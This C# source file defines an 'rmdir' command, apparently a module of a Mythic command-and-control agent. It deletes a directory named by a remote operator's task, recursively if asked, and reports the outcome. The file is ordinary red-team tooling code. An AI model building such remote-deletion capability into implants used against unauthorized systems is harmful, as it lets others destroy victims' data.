using Models.Tasks;

using Extend;

using System.IO;
using System.Text;

namespace Tasks.Commands
{
    public class DeleteDirectory : CerberusCommand
    {
        public override string Name => "rmdir";

        public override string Execute(MythicTask task)
        {
            var Arguments = Encoding.UTF8.GetBytes(task.parameters).Deserialize<RmdirParam>();
            

            if (Arguments is null || Arguments.path is null)
            {
                return "No path provided";
            }

            Directory.Delete(Arguments.path, Arguments.recurse);

            if (!Directory.Exists(Arguments.path))
            {
                return $"{Arguments.path} deleted";
            }

            return $"Failed to delete {Arguments.path}"; 
        }
    }

    public class RmdirParam
    {
        public string path { get; set; }
        public bool recurse { get; set; }
    }
}
